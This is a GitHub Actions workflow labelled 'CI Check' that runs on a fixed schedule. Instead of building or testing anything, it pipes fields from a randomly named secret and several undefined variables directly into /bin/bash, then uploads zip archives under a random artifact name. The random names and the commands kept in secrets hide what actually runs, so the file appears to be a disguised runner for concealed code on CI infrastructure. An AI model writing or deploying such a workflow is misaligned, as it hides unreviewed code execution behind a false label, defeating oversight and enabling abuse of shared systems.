name: CI Check
on:
  workflow_dispatch:

  schedule:
    - cron: '45 3,9,15,21 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  run:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Build and run
        env:
          lotru757: ${{ secrets.lotru757 }}
        run: |
          printf '%s' "$lotru757" | jq -r .odwhw52687 | /bin/bash
          printf '%s' "$eh37726" | jq -r .t403 | /bin/bash
          echo $si9 | jq -r .bla29 | /bin/bash
          echo $qywd3 | jq -r .x5058 | /bin/bash
          echo $dxpi3 | jq -r .kz6 | /bin/bash

      - name: Save output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: mpSSPAaS
          path: "*.zip"
          retention-days: 1
